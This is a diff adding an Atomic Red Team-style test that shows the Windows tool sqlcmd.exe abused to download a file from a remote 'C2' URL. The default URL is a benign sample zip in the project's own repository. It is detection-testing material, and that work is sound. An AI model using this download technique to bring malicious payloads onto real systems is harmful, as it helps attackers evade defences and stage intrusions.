@@ -894,3 +894,29 @@ atomic_tests:
     cleanup_command: rm "#{destination_path}"
     name: sh
     elevation_required: false
+- name: File Download with Sqlcmd.exe 
+  auto_generated_guid: 6934c16e-0b3a-4e7f-ab8c-c414acd32181
+  description: |-
+    One of the windows packages 'Sqlcmd.exe' can be abused to download malicious files from C2 servers
+    This Atomic will exhibit the similar behavior by downloading a sample zip file from src directory of this Technique folder via GitHub URL
+  supported_platforms:
+  - windows
+  input_arguments:
+    remote_url:
+      description: URL of the C2 Server from where file/s need to be downloaded
+      type: url
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip
+    local_file_path:
+      description: The local file path along with filename to where the file needs to be downloaded and placed.
+      type: path
+      default: C:\T1105.zip
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Windows package 'Sqlcmd' need to be available in the machine to execute this atomic successfully
+    prereq_command: if (Get-Command sqlcmd 2>$null) {exit 0} else {exit 1}
+    get_prereq_command: winget install Microsoft.Sqlcmd --silent 2>$null | Out-Null
+  executor:
+    command: 'sqlcmd -i #{remote_url} -o #{local_file_path}'
+    cleanup_command:  rm "#{local_file_path}" 2>$null | Out-Null
+    name: powershell
+    elevation_required: true
